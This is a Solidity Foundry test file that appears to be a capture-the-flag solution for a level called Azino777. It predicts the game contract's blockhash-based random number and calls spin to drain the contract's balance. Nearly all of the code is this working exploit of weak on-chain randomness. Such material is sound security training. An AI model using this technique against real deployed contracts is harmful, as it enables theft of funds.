// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/Azino777.sol";

// forge test --match-contract Azino777Test.t.sol -vvvv
contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        uint256 winningNumber = predictRand();
        instance.spin{value: 0.01 ether}(winningNumber);

        checkSuccess();
    }
    function predictRand() internal view returns (uint256) {
        uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
        uint256 factor = (FACTOR * 100) / 100;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        return uint256((uint256(hashVal) / factor)) % 100;
    }
    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
